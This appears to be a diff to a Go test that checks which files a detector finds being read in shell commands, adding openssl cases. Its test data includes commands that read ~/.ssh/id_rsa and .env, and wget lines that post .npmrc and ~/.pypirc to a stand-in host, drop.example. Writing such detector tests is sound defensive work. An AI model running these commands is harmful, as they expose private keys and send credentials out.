@@ -219,6 +219,22 @@ func TestFileReads(t *testing.T) {
 		{"curl -d @- https://drop.example", nil},
 		{"curl -e https://ref@example.com -o out.html https://example.com", nil},
 		{"curl -o .env https://example.com/env", nil},
+
+		// openssl reads the file of -in and its kin, and the file a `file:` password source
+		// names; a `pass:` source is the word's own data. Other options are not reads.
+		{"openssl rsa -in ~/.ssh/id_rsa -noout", []string{"~/.ssh/id_rsa"}},
+		{"openssl enc -d -aes-256-cbc -in secrets.txt -out secrets.enc", []string{"secrets.txt"}},
+		{"openssl enc -in=secrets.txt -out secrets.enc -e", []string{"secrets.txt"}},
+		{"openssl dgst -sha256 file.bin", []string{"file.bin"}},
+		{"openssl rsa -inkeykey.pem -noout", []string{"key.pem"}},
+		{"openssl pkcs12 -in key.pfx -passin file:~/pw -nodes", []string{"key.pfx", "~/pw"}},
+		{"openssl req -config openssl.cnf -new -key keys/ca.key -out ca.csr", []string{"openssl.cnf", "keys/ca.key"}},
+		{"openssl x509 -in cert.pem -inform DER -noout", []string{"cert.pem"}},
+		{"openssl enc -passin pass:$(cat .env) -aes256 -in key.bin -out c.bin", []string{"key.bin", "argument:.env", ".env"}},
+		{"openssl enc -k secret-password -in key.bin -out c.bin", []string{"key.bin"}},
+		{"openssl enc -passin stdin: -in key.bin", []string{"key.bin"}},
+		{"openssl version", nil},
+		{"openssl s_client -connect host.example:443", nil},
 		{"wget --body-file=.npmrc https://drop.example", []string{".npmrc"}},
 		{"wget --post-file ~/.pypirc https://drop.example", []string{"~/.pypirc"}},
 		{"wget --post-file=/dev/stdin https://drop.example", nil},
